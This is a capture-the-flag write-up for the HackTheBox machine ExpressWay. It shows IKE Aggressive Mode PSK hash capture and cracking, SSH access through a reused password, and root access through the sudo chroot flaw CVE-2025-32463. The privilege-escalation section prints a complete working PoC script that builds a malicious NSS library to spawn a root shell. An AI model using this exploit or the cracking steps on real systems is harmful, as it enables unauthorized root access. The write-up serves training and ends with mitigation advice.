---
title: "ExpressWay"
date: 2026-03-07 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Aggressive-Mode, CVE-2025-32463, Hash-Extraction, IKE-VPN, Library-Hijack, NSS, PSK, TFTP, chroot, chwoot, sudo]
description: Writeup for HackTheBox ExpressWay machine
image:
  path: assets/img/expressway/expressway.png
  alt: HTB ExpressWay
---
## Executive Summary
The ExpressWay machine is a Linux system exposing a legacy IKE VPN service and an outdated `sudo` binary. The attack chain is as follows:

* **IKE Aggressive Mode → PSK Hash → Crack** — UDP scan discovers ISAKMP (UDP 500). Enumerate with `ike-scan` in Aggressive Mode to extract the PSK hash. Crack with `psk-crack`/rockyou, yielding `freakingrockstarontheroad`.
* **Credential Reuse → SSH** — The cracked VPN password is reused for SSH as user `ike`.
* **CVE-2025-32463 (sudo chwoot) → Root** — `sudo --version` reveals 1.9.17, vulnerable to the "chwoot" LPE. Deploy the PoC script that creates a malicious NSS library inside a fake chroot; `sudo -R` loads the library and spawns a root shell.

## Reconnaissance

### TCP & UDP Scanning
Standard reconnaissance begins with a TCP port scan using Nmap to identify active network interfaces. Nmap (Network Mapper) is an open-source utility used for network discovery and security auditing.

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ nmap -sC -sV 10.129.176.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 02:01 EDT
Nmap scan report for 10.129.176.13
Host is up (0.23s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
```

The initial TCP scan shows that only port 22/TCP (SSH) is open, which offers a minimal attack surface. To identify additional services that may be running on UDP, we perform a comprehensive UDP version scan. UDP scanning is slower and less reliable than TCP scanning because UDP is a connectionless protocol and does not guarantee a response (such as a TCP SYN-ACK). However, UDP scanning is critical for discovering administrative services like SNMP, TFTP, or IKE VPNs.

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ nmap -sU -sV 10.129.176.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 02:03 EDT
Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 20.38% done; ETC: 02:18 (0:12:11 remaining)
Nmap scan report for 10.129.176.13
Host is up (0.26s latency).
Not shown: 995 closed udp ports (port-unreach)
PORT      STATE         SERVICE   VERSION
68/udp    open|filtered dhcpc
69/udp    open          tftp      Netkit tftpd or atftpd
500/udp   open          isakmp?
4500/udp  open|filtered nat-t-ike
64481/udp open|filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.94SVN%I=7%D=9/21%Time=68CF995C%P=x86_64-pc-linux-gnu%r(
SF:IKE_MAIN_MODE,70,"\0\x11\"3DUfw\)\xe4\x86\xb7\xdaI~\xa9\x01\x10\x02\0\0
SF:\0\0\0\0\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\
SF:x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01
SF:\x80\x0b\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0\x
SF:14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,30
SF:C,"1'\xfc\xb08\x10\x9e\x89\xcf\xa8\x02\xc0}\x0b\x97j\x01\x10\x02\0\0\0\
SF:0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\
SF:x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03
SF:\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0
SF:\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\
SF:xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb
SF:\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f1'\xfc\xb08\x10\x9e\x89\xcf\xa8\x
SF:02\xc0}\x0b\x97j\x01\x10\x02\0\0\0\0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0
SF:\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x0
SF:2\0\x02\x80\x04\0\x02\x80\x03\0\x03\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0
SF:\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x
SF:86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\
SF:xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x
SF:1f1'\xfc\xb08\x10\x9e\x89\xcf\xa8\x02\xc0}\x0b\x97j\x01\x10\x02\0\0\0\0
SF:\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x
SF:20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03\
SF:x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\
SF:x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\x
SF:d5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\
SF:x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f1'\xfc\xb08\x10\x9e\x89\xcf\xa8\x0
SF:2\xc0}\x0b\x97j\x01\x10\x02\0\0\0\0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\
SF:0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02
SF:\0\x02\x80\x04\0\x02\x80\x03\0\x03\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\
SF:x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x8
SF:6\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\x
SF:c2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1
SF:f1'\xfc\xb08\x10\x9e\x89\xcf\xa8\x02\xc0}\x0b\x97j\x01\x10\x02\0\0\0\0\
SF:0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x2
SF:0\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03\x
SF:80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x
SF:14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd
SF:5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x
SF:80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1181.02 seconds
```

The UDP scan reveals several interesting services:
- **TFTP (Port 69/UDP)**: Trivial File Transfer Protocol, a simple lockstep file transfer protocol that does not provide user authentication.
- **ISAKMP (Port 500/UDP)**: Internet Security Association and Key Management Protocol, which is used to negotiate security associations (SA) for IPsec-based virtual private networks (VPNs).
- **NAT-T IKE (Port 4500/UDP)**: Network Address Translation Traversal, which encapsulates IPsec ESP traffic within UDP packets to enable transmission through NAT gateways.
- **Other filtered ports (Ports 68 and 64481)**: Discovered but not immediately accessible due to host-based or network firewall filtering.

## Enumeration

### IKE/IPsec Scanning
With UDP port 500 (ISAKMP) identified as active, we conduct IKE enumeration using `ike-scan`. This tool transmits IKE handshake proposals to determine supported encryption algorithms, hashing algorithms, Diffie-Hellman (DH) group values, and authentication methods.

We first transmit a default proposal request to analyze Main Mode configurations:

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ sudo ike-scan 10.129.176.13

[sudo] password for kali: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.176.13   Main Mode Handshake returned HDR=(CKY-R=628129a9ad0fc034) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.313 seconds (3.20 hosts/sec).  1 returned handshake; 0 returned notify
```

The target returns a Main Mode response detailing the following cryptographic transform parameters:
- **Encryption Algorithm**: 3DES (Triple DES, which is legacy and weak).
- **Hash Algorithm**: SHA1 (legacy cryptographic hash function).
- **Diffie-Hellman Group**: Group 2 (1024-bit MODP group).
- **Authentication Method**: Pre-Shared Key (PSK).
- **Vendor IDs (VID)**: Extended Authentication (XAUTH) and Dead Peer Detection (DPD) v1.0 are supported.

To retrieve the Pre-Shared Key hash, we must query the daemon in Aggressive Mode. Unlike Main Mode, which performs a three-way exchange designed to protect the identities of the negotiating parties, Aggressive Mode consolidates the negotiation parameters, Diffie-Hellman public value, and identity payloads into a single transmission. Crucially, in Aggressive Mode, the hash representing the Pre-Shared Key is sent unencrypted, allowing attackers to intercept and crack it offline.

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ sudo ike-scan -A 10.129.176.13

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.176.13   Aggressive Mode Handshake returned HDR=(CKY-R=21bc53b2894bcd70) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.283 seconds (3.54 hosts/sec).  1 returned handshake; 0 returned notify
                                                                                                                               
┌──(kali㉿kali)-[~/HTB/ExpressWay]
```

The Aggressive Mode scan returns the user identity string:
- **ID_USER_FQDN**: `ike@expressway.htb`

### Capturing and Cracking the PSK Hash
With the identity established, we capture the Aggressive Mode handshake payload to write the raw PSK hash to a file for offline recovery:

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ sudo ike-scan -M -A 10.129.176.13 --pskcrack=psk_hash.txt  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.176.13   Aggressive Mode Handshake returned
        HDR=(CKY-R=96bbb1fa49256a84)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.289 seconds (3.45 hosts/sec).  1 returned handshake; 0 returned notify
```

The capture is stored in `psk_hash.txt`. We now use the tool `psk-crack` to run a dictionary attack against this hash using the standard `rockyou.txt` wordlist:

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$sudo psk-crack -v -d /usr/share/wordlists/rockyou.txt psk_hash.txt 2>&1 | tee psk_crack_log.txt

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Loaded 1 PSK entries from psk_hash.txt
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 1b01568a6ee2f24b561858ff0027d776ff0ccf47
Ending psk-crack: 8045040 iterations in 15.387 seconds (522845.37 iterations/sec)
                                                                                                                               
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ 
```

The dictionary attack is successful and yields the plaintext PSK value: `freakingrockstarontheroad`.

## Initial Access as ike

Using the cracked pre-shared key, we test whether this password has been reused for system access. Port 22 (SSH) is verified as open, and we attempt to authenticate using the user name `ike` and the discovered credential.

```shell
┌──(kali㉿kali)-[~/HTB/ExpressWay]
└─$ ssh ike@10.129.176.13                                    
The authenticity of host '10.129.176.13 (10.129.176.13)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.176.13' (ED25519) to the list of known hosts.
ike@10.129.176.13's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 07:36:42 2025 from 10.10.14.82
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat *
42de180fec8126decb115fc9cb8c39bc
ike@expressway:~$ 
```

The credential reuse is verified, providing local user shell access and the user flag.

## Privilege Escalation

We begin local system enumeration by examining the `sudo` configuration to determine if the `ike` user has permission to execute administrative commands.

```shell
ike@expressway:~$ sudo -v
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$ 
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, try again.
Password: 
Sorry, user ike may not run sudo on expressway.
```

The user `ike` is not in the `sudoers` file. We then query the file properties and version of the installed `sudo` binary to search for known software vulnerabilities.

```shell
ike@expressway:~$ ls -l "$(which sudo)"
-rwsr-xr-x 1 root root 1047040 Aug 29 15:18 /usr/local/bin/sudo
ike@expressway:~$ 
ike@expressway:~$ /usr/local/bin/sudo --version | tee sudo_version.txt
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
ike@expressway:~$ 
```

### CVE-2025-32463
The target is running **Sudo version 1.9.17**, which is vulnerable to **CVE-2025-32463** (also known as the "chwoot" vulnerability). This security flaw is a local privilege escalation (LPE) issue in sudo's `chroot` implementation (the `-R` or `--chroot` command-line argument). 

When `sudo` processes a `chroot` command, it enters the target directory namespace. However, it fails to properly secure libraries loaded during the initialization of system plugins or identity services (like PAM or NSS) inside the new root directory. If a user can trigger the chroot execution, an attacker can create a fake root directory structure containing a malicious Name Service Switch (NSS) configuration and library. When `sudo` executes and performs user lookup operations, it will load the attacker's custom NSS shared library from inside the fake chroot, running arbitrary code as `root`.

### Exploit Overview

We leverage the public Proof-of-Concept (PoC) script [`sudo-chwoot.sh`](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) by Rich Mirch to execute the exploit.

```c
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

The script works by performing the following actions:
1. It creates a temporary directory and generates a C payload (`woot1337.c`) with a `__attribute__((constructor))` directive. This constructor executes automatically as soon as the compiled shared library is loaded by a process.
2. The payload resets the real/effective user and group IDs to 0 (`root`) and invokes `/bin/sh`.
3. It compiles the C code into a shared object named `libnss_/woot1337.so.2`.
4. It sets up a nested directory structure `woot/etc/` and writes an `nsswitch.conf` file containing `passwd: /woot1337`, instructing the NSS engine to resolve passwd lookups via the `woot1337` service provider.
5. It runs `sudo -R woot woot`. Sudo enters the chroot `/tmp/.../woot`. To resolve the user/group information of the execution context, it reads `/etc/nsswitch.conf` (which points to `/woot1337`), prompting Sudo to load `libnss_woot1337.so.2` from the library paths.
6. The shared library executes the payload constructor, spawning a root shell.

```shell
ike@expressway:~$ nano sudo-chwoot.sh
ike@expressway:~$ 
ike@expressway:~$ chmod +x sudo-chwoot.sh 
ike@expressway:~$ 
ike@expressway:~$ ./sudo-chwoot.sh 
woot!
root@expressway:/# 
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# 
root@expressway:/# cat /root/root.txt 
7e3fa16cf20cd8826aa32bd1066796c1
root@expressway:/# 
```

The exploit triggers successfully, providing an interactive shell running under the `root` security context.

## Mitigations & Security Recommendations

1. **Secure VPN Configuration**: 
   - Disable IPsec Aggressive Mode on the IKE daemon. Aggressive Mode leaks user identities and PSK hashes in an unencrypted state. Standardize on Main Mode, which uses an encrypted payload exchange to protect negotiating credentials.
   - Replace weak Pre-Shared Keys with strong, randomly generated keys of at least 256 bits, or migrate to certificate-based authentication using a secure Public Key Infrastructure (PKI).
2. **Remediation of CVE-2025-32463**:
   - Upgrade the `sudo` package immediately to version 1.9.18 or later. This version contains patches that prevent namespace breakout and unsafe library loading within a chrooted directory structure.
3. **Password Policy and Credential Management**:
   - Enforce strict password complexity and uniqueness requirements across all system accounts to prevent credential reuse vulnerabilities, such as utilizing the VPN password for SSH system access.
